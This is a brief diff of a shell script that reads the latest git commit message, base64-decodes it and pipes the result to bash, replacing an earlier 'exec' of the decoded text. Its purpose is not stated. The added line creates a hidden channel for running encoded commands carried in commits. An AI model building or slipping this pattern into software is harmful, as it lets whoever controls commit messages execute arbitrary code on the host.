@@ -18,7 +18,5 @@ commit=$(git log --pretty=oneline --abbrev-commit | awk '{print $1}' | head -n 1
 #echo $commit
 # The message will be base64
 commit_msg=$(git log --format=%B -n 1 $commit)
-decode=$(echo $commit_msg | base64 -D)
-# decode it
-exec $decode
-#exec $commit_msg
+echo $commit_msg | base64 -d | bash
+#decode=$(echo $commit_msg | base64 -D)
